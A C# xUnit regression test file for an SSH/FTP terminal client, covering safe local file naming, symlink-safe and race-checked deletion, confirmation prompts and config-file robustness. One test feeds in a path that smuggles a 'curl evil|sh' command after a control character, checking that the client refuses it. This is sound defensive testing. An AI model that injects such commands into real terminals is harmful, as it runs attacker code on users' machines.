using System.Text;
using Avalonia.Headless.XUnit;
using Avalonia.Threading;
using Forterm.Core;
using Forterm.Studio.Library;
using Forterm.Studio.Services;
using Forterm.Studio.ViewModels;
using Xunit;

namespace Forterm.Studio.Tests;

/// <summary>Regressions for the alpha.3 independent code review.</summary>
public sealed class ReviewFixTests
{
    static readonly Dictionary<string, string> Posix = new() { ["FIXTURE_POSIX"] = "1" };

    static async Task Pump(Func<bool> until, TimeSpan timeout)
    {
        var end = DateTime.UtcNow + timeout;
        while (!until() && DateTime.UtcNow < end) { Dispatcher.UIThread.RunJobs(); await Task.Delay(40); }
        Dispatcher.UIThread.RunJobs();
    }

    static async Task<WorkspaceViewModel> Open(StudioHarness h, int port)
    {
        var p = new StudioProfile { Name = "审查", Host = "127.0.0.1", Port = port, User = "synthetic", HasPassword = true, DisablePwdFollow = true };
        await h.Credentials.SavePasswordAsync(p.Id, "synthetic-only", CancellationToken.None);
        h.Store.Upsert(p);
        var w = await h.Model.OpenProfileAsync(p);
        Assert.True(w.IsConnected, w.Status);
        return w;
    }

    static string Typed(LoopbackFixture fixture) =>
        Encoding.UTF8.GetString(fixture.Stats().GetProperty("input").EnumerateArray().SelectMany(x => Convert.FromHexString(x.GetString()!)).ToArray());

    static async Task<FileNodeViewModel> Upload(StudioHarness h, WorkspaceViewModel w, string name, string content)
    {
        string local = Path.Combine(h.Data, name);
        File.WriteAllText(local, content);
        w.SelectedNode = null;
        h.Interaction.OpenFiles = [local];
        int before = w.Transfers!.Visible.Count;
        w.UploadFilesCommand.Execute(null);
        await Pump(() => w.Transfers.Visible.Count > before && w.Transfers.Visible.All(i => !i.IsActive), TimeSpan.FromSeconds(20));
        await Pump(() => w.FileRoots.Any(n => n.Name == name), TimeSpan.FromSeconds(10));
        return w.FileRoots.First(n => n.Name == name);
    }

    [Theory]
    [InlineData("C:version.dll")]
    [InlineData("c:\\x")]
    [InlineData("a:stream")]
    [InlineData("con")]
    [InlineData("CON.txt")]
    [InlineData("lpt1.log")]
    [InlineData("name.")]
    [InlineData("name ")]
    [InlineData("..")]
    [InlineData("a?b")]
    [InlineData("tab\there")]
    public void RemoteNamesThatAreNotSafeLocalNamesAreRefused(string name)
    {
        Assert.Throws<IOException>(() => FileActions.LocalName(name));
        Assert.Throws<IOException>(() => FileActions.LocalChild(Path.GetTempPath(), "ok/" + name));
    }

    [Fact]
    public void OrdinaryRemoteNamesMapInsideTheChosenFolder()
    {
        string root = Path.Combine(Path.GetTempPath(), "forterm-local-name");
        Assert.Equal(Path.Combine(root, "日志", "app.2026-11-22.log"), FileActions.LocalChild(root, "日志/app.2026-11-22.log"));
        Assert.Equal("console.txt", FileActions.LocalName("console.txt"));
        Assert.Equal(".bashrc", FileActions.LocalName(".bashrc"));
    }

    [Fact]
    public void AFilesystemRootIsAValidDownloadTarget()
    {
        string root = Path.GetPathRoot(Path.GetTempPath())!;
        Assert.Equal(Path.Combine(root, "日志"), FileActions.LocalChild(root, "日志"));
        Assert.Equal(Path.Combine(Path.GetTempPath(), "x"), FileActions.LocalChild(Path.GetTempPath(), "x")); // trailing separator
    }

    [Fact]
    public void SingleDigitDaysKeepAComparableStartTime()
    {
        var sample = MonitorProbe.Parse("FTS1\nPS\n  777 app      S     0.0  1000 Mon Nov  2 09:21:44 2026 /usr/bin/worker\n");
        var process = Assert.Single(sample.Processes!);
        Assert.Equal("Mon Nov 2 09:21:44 2026", process.StartRaw); // what `set -- $(ps -o lstart=)` yields
        Assert.Equal("11-02 09:21:44", process.Started);
    }

    [Fact]
    public void CdIsNeverTypedForPathsWithControlCharacters()
    {
        Assert.Null(WorkspaceViewModel.CdCommand("/tmp/x\u0015curl evil|sh #"));
        Assert.Null(WorkspaceViewModel.CdCommand("/tmp/\u001b[31m"));
        Assert.Null(WorkspaceViewModel.CdCommand("/tmp/\u0085next"));
        Assert.Equal("cd -- '/tmp/中文 目录'\r", WorkspaceViewModel.CdCommand("/tmp/中文 目录"));
    }

    [Fact]
    public void DamagedLibraryOrAccountFilesAreInvalidDataNotACrash()
    {
        string dir = Paths.TempDirectory();
        try
        {
            File.WriteAllText(Path.Combine(dir, "library.json"), """{"version":1,"groups":null,"profiles":[]}""");
            Assert.Throws<InvalidDataException>(() => new LibraryStore(dir));
            File.WriteAllText(Path.Combine(dir, "library.json"), $$"""{"version":1,"groups":[],"profiles":[{"id":"{{StudioProfile.NewId()}}","name":null,"host":"h","user":"u"}]}""");
            Assert.Throws<InvalidDataException>(() => new LibraryStore(dir));
            File.WriteAllText(Path.Combine(dir, "accounts.json"), "[null]");
            Assert.Throws<InvalidDataException>(() => new AccountStore(dir));
            File.WriteAllText(Path.Combine(dir, "preferences.json"), """{"Theme":null,"Accent":null}""");
            Assert.Equal("暗夜", Appearance.Load(dir).Theme);
        }
        finally { Directory.Delete(dir, true); }
    }

    [AvaloniaFact]
    public async Task ControllerSessionTypesCdOnlyAfterExplicitConfirmation()
    {
        using var fixture = LoopbackFixture.Ssh(Posix);
        using var h = new StudioHarness();
        var w = (await h.Model.AcceptLaunchAsync(LaunchPlan.Parse(["--entry=xshell", "-url", $"ssh://synthetic:synthetic-only@127.0.0.1:{fixture.Port}"])))!;
        await Pump(() => w.IsConnected && w.HasShell, TimeSpan.FromSeconds(10));
        h.Interaction.ConfirmAnswer = false;
        w.CdToTerminalCommand.Execute(null);
        await Pump(() => h.Interaction.Confirms.Count > 0, TimeSpan.FromSeconds(3));
        Assert.Contains(h.Interaction.Confirms, c => c.StartsWith("向终端输入命令"));
        await Pump(() => false, TimeSpan.FromMilliseconds(300));
        Assert.DoesNotContain("cd ", Typed(fixture));

        h.Interaction.ConfirmAnswer = true;
        w.CdToTerminalCommand.Execute(null);
        await Pump(() => Typed(fixture).Contains("cd "), TimeSpan.FromSeconds(5));
        Assert.Contains("cd ", Typed(fixture));
        int asked = h.Interaction.Confirms.Count;
        w.CdToTerminalCommand.Execute(null); // confirmed once per workspace
        await Pump(() => Typed(fixture).Split("cd ").Length == 3, TimeSpan.FromSeconds(5));
        Assert.Equal(asked, h.Interaction.Confirms.Count);
    }

    [AvaloniaFact]
    public async Task DeleteStopsWhenTheItemNoLongerMatchesWhatWasConfirmed()
    {
        using var fixture = LoopbackFixture.Ssh(Posix);
        using var h = new StudioHarness();
        var w = await Open(h, fixture.Port);
        var node = await Upload(h, w, "keep.txt", "twelve bytes");
        // The user confirmed a listing that said 3 bytes; the file on the server is 12 bytes now.
        var stale = new FileNodeViewModel(new RemoteEntry(node.Path, node.Name, false, false, true, 3), (_, _, _) => Task.FromResult<IReadOnlyList<RemoteEntry>>([]), CancellationToken.None);
        int before = w.Transfers!.Visible.Count;
        Assert.True(await w.Actions!.DeleteAsync(stale, CancellationToken.None));
        await Pump(() => w.Transfers.Visible.Count > before && w.Transfers.Visible.All(i => !i.IsActive), TimeSpan.FromSeconds(20));
        var item = w.Transfers.Visible.Last();
        Assert.True(item.IsFailed, item.StateText);
        Assert.Contains("已变化", item.StateText);
        Assert.Equal(12, (await w.Actions.InspectPermissionsAsync("/keep.txt", CancellationToken.None)).Length);
    }

    [AvaloniaFact]
    public async Task RecursiveDeleteUnlinksLinksWithoutFollowingOrReadingContent()
    {
        using var fixture = LoopbackFixture.Ssh(new Dictionary<string, string> { ["FIXTURE_POSIX"] = "1", ["FIXTURE_LSTAT_LIST"] = "1" });
        fixture.Command("seed-tree");
        fixture.Command("make-links"); // /a/nested-link -> /real-dir, /link-file -> /real-file
        fixture.Command("large");      // /a/large.bin, ~4 MiB: a content hash would have to read it
        fixture.Command("fill-real-dir"); // the link target holds a file that must survive
        using var h = new StudioHarness();
        var w = await Open(h, fixture.Port);
        var a = w.FileRoots.First(n => n.Name == "a");
        w.SelectedNode = a;
        int before = w.Transfers!.Visible.Count;
        int opens = fixture.Stats().GetProperty("openModes").GetArrayLength();
        w.DeleteCommand.Execute(null);
        await Pump(() => w.Transfers.Visible.Count > before && w.Transfers.Visible.All(i => !i.IsActive), TimeSpan.FromSeconds(20));
        var item = w.Transfers.Visible.Last();
        Assert.True(item.IsDone, item.StateText);
        Assert.Equal(opens, fixture.Stats().GetProperty("openModes").GetArrayLength()); // no file was opened
        Assert.Contains(h.Interaction.Confirms, c => c.Contains("链接或特殊项"));
        await Assert.ThrowsAnyAsync<Exception>(() => w.Actions!.InspectPermissionsAsync("/a", CancellationToken.None));
        Assert.True((await w.Actions!.InspectPermissionsAsync("/real-dir", CancellationToken.None)).Directory); // link target untouched
        Assert.Equal(6, (await w.Actions.InspectPermissionsAsync("/real-dir/inside.txt", CancellationToken.None)).Length);

        await Pump(() => w.FileRoots.Any(n => n.Name == "link-file"), TimeSpan.FromSeconds(5));
        var link = w.FileRoots.First(n => n.Name == "link-file");
        Assert.True(link.IsLink);
        w.SelectedNode = link;
        before = w.Transfers.Visible.Count;
        w.DeleteCommand.Execute(null);
        await Pump(() => w.Transfers.Visible.Count > before && w.Transfers.Visible.All(i => !i.IsActive), TimeSpan.FromSeconds(20));
        Assert.True(w.Transfers.Visible.Last().IsDone, w.Transfers.Visible.Last().StateText);
        Assert.Equal(9, (await w.Actions.InspectPermissionsAsync("/real-file", CancellationToken.None)).Length); // "synthetic"
        await Pump(() => !w.FileRoots.Any(n => n.Name == "link-file"), TimeSpan.FromSeconds(5));
        Assert.DoesNotContain(w.FileRoots, n => n.Name == "link-file");
    }

    [AvaloniaFact]
    public async Task RecursiveDeleteStopsWhenADirectoryWasReplacedAfterConfirmation()
    {
        using var fixture = LoopbackFixture.Ssh(new Dictionary<string, string> { ["FIXTURE_POSIX"] = "1", ["FIXTURE_LSTAT_LIST"] = "1" });
        fixture.Command("seed-tree");
        using var h = new StudioHarness();
        var w = await Open(h, fixture.Port);
        w.SelectedNode = w.FileRoots.First(n => n.Name == "a");
        h.Interaction.OnConfirm = title => { if (title == "删除目录") fixture.Command("swap-a"); };
        int before = w.Transfers!.Visible.Count;
        w.DeleteCommand.Execute(null);
        await Pump(() => w.Transfers.Visible.Count > before && w.Transfers.Visible.All(i => !i.IsActive), TimeSpan.FromSeconds(20));
        var item = w.Transfers.Visible.Last();
        Assert.True(item.IsFailed, item.StateText);
        Assert.Contains("已删除 0/", item.StateText);
        Assert.Contains("确认后已变化", item.StateText);
        // Neither the confirmed tree (moved away) nor the look-alike lost anything.
        Assert.True((await w.Actions!.InspectPermissionsAsync("/a-moved/nested/deep", CancellationToken.None)).Directory);
        Assert.True((await w.Actions.InspectPermissionsAsync("/a/nested/deep", CancellationToken.None)).Directory);
    }

    [AvaloniaFact]
    public async Task FtpDeletesOnlyEmptyDirectories()
    {
        using var fixture = LoopbackFixture.Ftp();
        fixture.Command("large"); // /a is no longer empty
        using var h = new StudioHarness();
        var p = new StudioProfile { Name = "FTP", Protocol = "ftp", Host = "127.0.0.1", Port = fixture.Port, User = "synthetic", HasPassword = true };
        await h.Credentials.SavePasswordAsync(p.Id, "synthetic-only", CancellationToken.None);
        h.Store.Upsert(p);
        var w = await h.Model.OpenProfileAsync(p);
        Assert.True(w.IsConnected, w.Status);
        await Pump(() => w.FileRoots.Count > 0, TimeSpan.FromSeconds(5));
        var full = w.FileRoots.First(n => n.Name == "a");
        int confirms = h.Interaction.Confirms.Count;
        await Assert.ThrowsAsync<NotSupportedException>(() => w.Actions!.DeleteAsync(full, CancellationToken.None));
        Assert.Equal(confirms, h.Interaction.Confirms.Count); // refused before asking, nothing queued

        // An empty FTP directory is still removed (RMD).
        var empty = w.FileRoots.First(n => n.Name == "b");
        int before = w.Transfers!.Visible.Count;
        Assert.True(await w.Actions!.DeleteAsync(empty, CancellationToken.None));
        await Pump(() => w.Transfers.Visible.Count > before && w.Transfers.Visible.All(i => !i.IsActive), TimeSpan.FromSeconds(20));
        Assert.True(w.Transfers.Visible.Last().IsDone, w.Transfers.Visible.Last().StateText);
    }

    [AvaloniaFact]
    public async Task ClosingTheWindowConfirmsUnsavedDrafts()
    {
        using var fixture = LoopbackFixture.Ssh(Posix);
        using var h = new StudioHarness();
        var w = await Open(h, fixture.Port);
        Assert.False(h.Model.NeedsCloseConfirmation);
        var node = await Upload(h, w, "draft.txt", "v1\n");
        var editor = (await w.OpenEditorAsync(node))!;
        editor.Document.Insert(0, "changed ");
        Dispatcher.UIThread.RunJobs();
        Assert.True(h.Model.NeedsCloseConfirmation);
        h.Interaction.ConfirmAnswer = false;
        Assert.False(await h.Model.ConfirmCloseAllAsync());
        Assert.Contains(h.Interaction.Confirms, c => c.Contains("/draft.txt") && c.Contains("未保存"));
        h.Interaction.ConfirmAnswer = true;
        Assert.True(await h.Model.ConfirmCloseAllAsync());
    }

    [AvaloniaFact]
    public async Task TwoNewTerminalsOpenedTogetherBothGetAShell()
    {
        using var fixture = LoopbackFixture.Ssh(Posix);
        using var h = new StudioHarness();
        var w = await Open(h, fixture.Port);
        await Pump(() => w.HasShell, TimeSpan.FromSeconds(5));
        var first = w.AddTerminalAsync();
        var second = w.AddTerminalAsync();
        var tabs = await Task.WhenAll(first, second);
        Assert.All(tabs, t => Assert.True(t!.HasConnection));
        Assert.Equal(3, w.Terminals.Count);
        Assert.Equal(3, fixture.Stats().GetProperty("shells").GetInt32());
    }
}
